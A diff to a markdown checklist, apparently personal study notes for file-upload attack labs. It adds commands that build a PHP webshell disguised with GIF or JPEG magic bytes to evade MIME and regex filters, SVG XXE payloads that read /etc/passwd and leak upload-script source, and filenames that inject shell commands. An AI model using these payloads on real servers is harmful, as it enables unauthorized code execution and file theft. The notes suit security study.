@@ -61,11 +61,19 @@
 - [ ] Forward — check for success
 
 ## Phase 8 — Bypass MIME-Type Filter
-- [ ] Add `GIF8` as the first line of the file content in Burp
-- [ ] Keep `filename="shell.php"` — PHP still executes despite GIF8 prefix
-- [ ] Verify locally if needed: `file shell.php` should show "GIF image data"
-- [ ] If both Content-Type AND MIME are checked: change header to `image/gif` AND add `GIF8`
-- [ ] Visit `shell.php?cmd=id` — output starts with "GIF8" before the command output
+- [ ] Determine what MIME type the filter accepts before choosing magic bytes
+- [ ] **GIF8** → produces `image/gif` — use when filter explicitly allows gif
+  ```bash
+  echo "GIF8" > shell.php && echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
+  ```
+- [ ] **JPEG magic bytes** → produces `image/jpeg` — use when filter requires MIME ending in 'g' (jpe**g**)
+  ```bash
+  printf '\xFF\xD8\xFF\xe0' > shell.php && echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
+  ```
+- [ ] **WARNING:** `image/gif` ends in `f` not `g` — fails regex filters like `/image\/[a-z]{2,3}g/`. Use JPEG bytes instead.
+- [ ] Match Content-Type header to magic bytes: GIF8 → `image/gif`, JPEG → `image/jpeg`
+- [ ] Keep `filename="shell.php"` — PHP still executes despite magic byte prefix
+- [ ] Output will have magic byte prefix before command output — that's normal
 
 ## Phase 9 — Limited File Upload Attacks
 **XSS via SVG:**
@@ -78,11 +86,18 @@
 
 **XXE via SVG (read files):**
 - [ ] Create SVG with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
-- [ ] Upload and view → should display /etc/passwd content
+- [ ] Upload → check the upload response FIRST (XXE may fire at upload time, not access time)
+- [ ] If response contains file content → XXE fired during upload, no need to visit the file URL
 
-**XXE via SVG (read PHP source):**
-- [ ] Create SVG with `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">`
-- [ ] Upload and view → decode base64 output → read source code
+**XXE via SVG (read upload script source — do this before uploading a webshell):**
+- [ ] Use absolute path: `php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php`
+- [ ] Decode response: `echo '<BASE64>' | base64 -d`
+- [ ] From source, note: upload directory (`$target_dir`), file naming scheme (`$fileName`), exact filter regexes
+- [ ] Construct webshell URL from upload dir + naming scheme before uploading
+
+**XXE via SVG (read PHP source — generic):**
+- [ ] `php://filter/convert.base64-encode/resource=/var/www/html/index.php`
+- [ ] Decode → read source code for further enumeration
 
 ## Phase 10 — Other Attacks
 - [ ] Try command injection in filename: `file$(whoami).jpg`, `file.jpg||whoami`
